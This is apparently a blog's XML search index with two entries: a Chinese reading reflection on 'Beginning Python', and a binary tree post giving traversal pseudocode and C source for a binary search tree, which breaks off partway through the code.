<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>《Beginning Python: From Novice to Professional》</title>
      <link href="/2018/11/23/%E3%80%8ABeginning-Python-From-Novice-to-Professional%E3%80%8B/"/>
      <url>/2018/11/23/%E3%80%8ABeginning-Python-From-Novice-to-Professional%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2018/11/23/Fi5aLt.jpg" alt=""></p><a id="more"></a><p>&#x501F;&#x8FD9;&#x672C;&#x4E66;&#x4E5F;&#x5C06;&#x8FD1;&#x5FEB;&#x4E00;&#x4E2A;&#x6708;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x76F4;&#x5230;&#x4ECA;&#x5929;&#x81EA;&#x5DF1;&#x624D;&#x82B1;&#x4E00;&#x4E2A;&#x4E0B;&#x5348;&#x7684;&#x65F6;&#x95F4;&#x7684;&#x65F6;&#x95F4;&#x5927;&#x81F4;&#x7684;&#x628A;&#x8FD9;&#x672C;&#x4E66;&#x770B;&#x4E86;&#x4E00;&#x904D;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x5DF1;&#x5E73;&#x65F6;&#x5237;OJ&#x7684;&#x65F6;&#x5019;&#x53EA;&#x7528;&#x5230;Python&#x7684;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x6B21;&#x770B;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x5C31;&#x628A;&#x91CD;&#x70B9;&#x653E;&#x5728;&#x4E86;Python&#x7684;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#x4E0A;&#x9762;&#xFF0C;&#x5173;&#x4E8E;python&#x7F51;&#x7EDC;&#x7F16;&#x7A0B;&#x548C;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x7684;&#x5185;&#x5BB9;&#x81EA;&#x5DF1;&#x4E5F;&#x5C31;&#x7FFB;&#x4E86;&#x7FFB;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x592A;&#x4ED4;&#x7EC6;&#x5730;&#x770B;&#x3002;&#x771F;&#x7684;&#x611F;&#x89C9;&#x81EA;&#x5DF1;&#x770B;&#x4E66;&#x770B;&#x7684;&#x8FD8;&#x662F;&#x592A;&#x6162;&#x4E86;&#xFF0C;&#x4E0D;&#x8FC7;&#x548C;&#x4EE5;&#x524D;&#x76F8;&#x6BD4;&#x8FD8;&#x662F;&#x6709;&#x4E9B;&#x63D0;&#x9AD8;&#x7684;&#x3002;</p><p>&#x6709;&#x65F6;&#x5019;&#x81EA;&#x5DF1;&#x4E5F;&#x4F1A;&#x95EE;&#x81EA;&#x5DF1;&#xFF0C;&#x81EA;&#x5DF1;&#x770B;&#x4E66;&#x5230;&#x5E95;&#x662F;&#x4E3A;&#x4E86;&#x4EC0;&#x4E48;&#xFF1F;&#x6709;&#x65F6;&#x5019;&#x6211;&#x7684;&#x5FC3;&#x4E2D;&#x603B;&#x662F;&#x60F3;&#x7740;&#x628A;&#x8FD9;&#x672C;&#x4E66;&#x5FEB;&#x70B9;&#x770B;&#x5B8C;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x628A;&#x6CE8;&#x610F;&#x529B;&#x653E;&#x5728;&#x81EA;&#x5DF1;&#x770B;&#x8FC7;&#x7684;&#x5185;&#x5BB9;&#x81EA;&#x5DF1;&#x5230;&#x5E95;&#x5B66;&#x4F1A;&#x4E86;&#x591A;&#x5C11;&#x4E0A;&#x9762;&#x3002;</p><p>&#x524D;&#x51E0;&#x5929;&#x81EA;&#x5DF1;&#x5728;&#x770B;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x90A3;&#x4E0A;&#x9762;&#x4ECB;&#x7ECD;&#x4E86;&#x4E00;&#x79CD;&#x770B;&#x4E66;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5C31;&#x662F;&#x81EA;&#x5DF1;&#x53EF;&#x4EE5;&#x591A;&#x501F;&#x51E0;&#x672C;&#x4E66;&#xFF0C;&#x60F3;&#x770B;&#x54EA;&#x672C;&#x5C31;&#x770B;&#x90A3;&#x672C;&#xFF0C;&#x628A;&#x770B;&#x4E66;&#x5F53;&#x6210;&#x662F;&#x770B;&#x88AB;&#x4EBA;&#x7684;&#x535A;&#x5BA2;&#x5C31;&#x884C;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x5728;&#x610F;&#x81EA;&#x5DF1;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x80FD;&#x8FC7;&#x628A;&#x8FD9;&#x672C;&#x4E66;&#x770B;&#x5B8C;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x53EF;&#x4EE5;&#x8BD5;&#x4E00;&#x4E0B;&#x8FD9;&#x79CD;&#x770B;&#x4E66;&#x7684;&#x65B9;&#x6CD5;&#x3002;</p><p><img src="https://s1.ax1x.com/2018/11/23/Fi5JRH.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reading </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Binary Tree</title>
      <link href="/2018/11/18/Binary-Tree/"/>
      <url>/2018/11/18/Binary-Tree/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2018/11/18/FSZux1.jpg" alt=""></p><a id="more"></a><p><img src="https://s1.ax1x.com/2018/11/18/FSMYi8.png" alt=""></p><h3 id="Traversing-the-binary-tree"><a href="#Traversing-the-binary-tree" class="headerlink" title="Traversing the binary tree."></a>Traversing the binary tree.</h3><h4 id="recurisive-formula"><a href="#recurisive-formula" class="headerlink" title="recurisive formula:"></a>recurisive formula:</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x524D;&#x5E8F;&#x904D;&#x5386;&#x7684;&#x9012;&#x63A8;&#x516C;&#x5F0F;&#xFF1A;</span><br><span class="line">preOrder(r) = print r-&gt;preOrder(r-&gt;left)-&gt;preOrder(r-&gt;right)</span><br><span class="line"></span><br><span class="line">&#x4E2D;&#x5E8F;&#x904D;&#x5386;&#x7684;&#x9012;&#x63A8;&#x516C;&#x5F0F;&#xFF1A;</span><br><span class="line">inOrder(r) = inOrder(r-&gt;left)-&gt;print r-&gt;inOrder(r-&gt;right)</span><br><span class="line"></span><br><span class="line">&#x540E;&#x5E8F;&#x904D;&#x5386;&#x7684;&#x9012;&#x63A8;&#x516C;&#x5F0F;&#xFF1A;</span><br><span class="line">postOrder(r) = postOrder(r-&gt;left)-&gt;postOrder(r-&gt;right)-&gt;print r</span><br></pre></td></tr></tbody></table></figure><h4 id="code"><a href="#code" class="headerlink" title="code:"></a>code:</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(Node* root)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (root == null) <span class="keyword">return</span>;</span><br><span class="line">  print root <span class="comment">// &#x6B64;&#x5904;&#x4E3A;&#x4F2A;&#x4EE3;&#x7801;&#xFF0C;&#x8868;&#x793A;&#x6253;&#x5370; root &#x8282;&#x70B9;</span></span><br><span class="line">  preOrder(root-&gt;left);</span><br><span class="line">  preOrder(root-&gt;right);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(Node* root)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (root == null) <span class="keyword">return</span>;</span><br><span class="line">  inOrder(root-&gt;left);</span><br><span class="line">  print root <span class="comment">// &#x6B64;&#x5904;&#x4E3A;&#x4F2A;&#x4EE3;&#x7801;&#xFF0C;&#x8868;&#x793A;&#x6253;&#x5370; root &#x8282;&#x70B9;</span></span><br><span class="line">  inOrder(root-&gt;right);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postOrder</span><span class="params">(Node* root)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (root == null) <span class="keyword">return</span>;</span><br><span class="line">  postOrder(root-&gt;left);</span><br><span class="line">  postOrder(root-&gt;right);</span><br><span class="line">  print root <span class="comment">// &#x6B64;&#x5904;&#x4E3A;&#x4F2A;&#x4EE3;&#x7801;&#xFF0C;&#x8868;&#x793A;&#x6253;&#x5370; root &#x8282;&#x70B9;</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Binary-serach-tree"><a href="#Binary-serach-tree" class="headerlink" title="Binary serach tree"></a>Binary serach tree</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment"> &gt; File Name: binarysearchtree.c</span></span><br><span class="line"><span class="comment"> &gt; Author:  jinshaohui</span></span><br><span class="line"><span class="comment"> &gt; Mail:    jinshaohui789@163.com</span></span><br><span class="line"><span class="comment"> &gt; Time:    18-11-12</span></span><br><span class="line"><span class="comment"> &gt; Desc:    </span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;binarysearchtree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">bstree *<span class="title">bstree_create</span><span class="params">(compare_fuc compare,destory_fuc destory)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">bstree *tree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">tree = (bstree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree));</span><br><span class="line"><span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">tree-&gt;size = <span class="number">0</span>;</span><br><span class="line">    tree-&gt;compare = compare;</span><br><span class="line">    tree-&gt;destory = destory;</span><br><span class="line">tree-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">bstree_node *<span class="title">bstree_search</span><span class="params">(bstree *tree,mytype data)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line">    node = tree-&gt;root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(node != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">res = tree-&gt;compare(data,node-&gt;data);</span><br><span class="line"><span class="keyword">if</span>(res == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (res &gt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">node = node-&gt;rchild;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">node = node-&gt;lchild;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">   </span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bstree_insert</span><span class="params">(bstree * tree, mytype data)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">    bstree_node *tmp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">node = (bstree_node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree_node));</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">node-&gt;data = data;</span><br><span class="line">node-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">node-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*&#x5982;&#x679C;&#x4E8C;&#x53C9;&#x6811;&#x4E3A;&#x7A7A;&#xFF0C;&#x76F4;&#x63A5;&#x6302;&#x5230;&#x6839;&#x8282;&#x70B9;*/</span></span><br><span class="line"><span class="keyword">if</span> (bstree_is_empty(tree))</span><br><span class="line">{</span><br><span class="line">        tree-&gt;root = node;</span><br><span class="line">tree-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">tmp = tree-&gt;root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">res = tree-&gt;compare(data,tmp-&gt;data);</span><br><span class="line"><span class="keyword">if</span> (res &gt; <span class="number">0</span>) <span class="comment">/*&#x53BB;&#x53F3;&#x5B69;&#x5B50;&#x67E5;&#x627E;*/</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">tmp-&gt;rchild = node;</span><br><span class="line">tree-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">    tmp = tmp-&gt;rchild;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="comment">/*&#x53BB;&#x5DE6;&#x5B69;&#x5B50;&#x67E5;&#x627E;*/</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(tmp-&gt;lchild == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">tmp-&gt;lchild = node;</span><br><span class="line">tree-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">tmp = tmp-&gt;lchild;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bstree_delete</span><span class="params">(bstree *tree,mytype data)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;<span class="comment">/*&#x8981;&#x5220;&#x9664;&#x7684;&#x8282;&#x70B9;*/</span></span><br><span class="line">bstree_node *pnode = <span class="literal">NULL</span>;<span class="comment">/*&#x8981;&#x5220;&#x9664;&#x8282;&#x70B9;&#x7684;&#x7236;&#x8282;&#x70B9;*/</span></span><br><span class="line">bstree_node *minnode = <span class="literal">NULL</span>;<span class="comment">/*&#x8981;&#x5220;&#x9664;&#x8282;&#x70B9;&#x7684;&#x7236;&#x8282;&#x70B9;*/</span></span><br><span class="line">bstree_node *pminnode = <span class="literal">NULL</span>;<span class="comment">/*&#x8981;&#x5220;&#x9664;&#x8282;&#x70B9;&#x7684;&#x7236;&#x8282;&#x70B9;*/</span></span><br><span class="line">    mytype tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">node = tree-&gt;root;</span><br><span class="line"><span class="keyword">while</span> ((node != <span class="literal">NULL</span>) &amp;&amp; ((res = tree-&gt;compare(data,node-&gt;data)) != <span class="number">0</span>))</span><br><span class="line">{</span><br><span class="line">pnode = node;</span><br><span class="line"><span class="keyword">if</span>(res &gt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">            node = node-&gt;rchild;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">            node = node-&gt;lchild;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*&#x8BF4;&#x660E;&#x8981;&#x5220;&#x9664;&#x7684;&#x8282;&#x70B9;&#x4E0D;&#x5B58;&#x5728;*/</span></span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*1&#x3001;&#x5982;&#x679C;&#x8981;&#x5220;&#x9664;node&#x6709;2&#x4E2A;&#x5B50;&#x8282;&#x70B9;&#xFF0C;&#x9700;&#x8981;&#x627E;&#x5230;&#x53F3;&#x5B50;&#x6811;&#x7684;&#x6700;&#x5C0F;&#x8282;&#x70B9;minnode&#xFF0C;</span></span><br><span class="line"><span class="comment"> * &#x66F4;&#x65B0;minnode&#x548C;node&#x8282;&#x70B9;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x6837;minnode&#x8282;&#x70B9;&#x5C31;&#x662F;&#x8981;&#x5220;&#x9664;&#x7684;&#x8282;&#x70B9;</span></span><br><span class="line"><span class="comment"> * &#x518D;&#x66F4;&#x65B0;node&#x548C;pnode&#x8282;&#x70B9;&#x6307;&#x5411;&#x8981;&#x5220;&#x9664;&#x7684;&#x8282;&#x70B9;*/</span></span><br><span class="line"><span class="keyword">if</span> ((node-&gt;lchild != <span class="literal">NULL</span>) &amp;&amp; (node-&gt;rchild != <span class="literal">NULL</span>))</span><br><span class="line">{</span><br><span class="line">minnode = node-&gt;rchild;</span><br><span class="line">pminnode = node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(minnode-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">pminnode = minnode;</span><br><span class="line">minnode = minnode-&gt;lchild;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*node &#x8282;&#x70B9;&#x548C;minnode&#x8282;&#x70B9;&#x6570;&#x636E;&#x4E92;&#x6362;*/</span></span><br><span class="line">        tmp = node-&gt;data;</span><br><span class="line">node-&gt;data = minnode-&gt;data;</span><br><span class="line">minnode-&gt;data = tmp;</span><br><span class="line"><span class="comment">/*&#x66F4;&#x65B0;&#x8981;&#x5220;&#x9664;&#x7684;&#x8282;&#x70B9;&#x548C;&#x5176;&#x7236;&#x8282;&#x70B9;*/</span></span><br><span class="line">node = minnode;</span><br><span class="line">pnode = pminnode;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*2&#x3001;&#x5F53;&#x524D;&#x8981;&#x5220;&#x9664;&#x7684;&#x8282;&#x70B9;&#x53EA;&#x6709;&#x5DE6;&#x5B69;&#x5B50;&#x6216;&#x8005;&#x53F3;&#x5B69;&#x5B50;&#x65F6;&#xFF0C;&#x76F4;&#x63A5;&#x7236;&#x8282;&#x70B9;&#x7684;&#x76F4;&#x5411;&#x5220;&#x9664;&#x7684;&#x8282;&#x70B9;*/</span></span><br><span class="line"><span class="keyword">if</span> (node-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">        minnode = node-&gt;lchild;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">minnode = node-&gt;rchild;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">minnode = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pnode == <span class="literal">NULL</span>)<span class="comment">/*&#x5F53;&#x8981;&#x5220;&#x9664;&#x7684;&#x65F6;&#x6839;&#x8282;&#x70B9;&#x65F6;,*/</span></span><br><span class="line">{</span><br><span class="line">tree-&gt;root = minnode;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pnode-&gt;lchild == node)</span><br><span class="line">{</span><br><span class="line">pnode-&gt;lchild = minnode;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">pnode-&gt;rchild = minnode;</span><br><span class="line">}</span><br><span class="line">    tree-&gt;size--;</span><br><span class="line"><span class="built_in">free</span> (node);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span 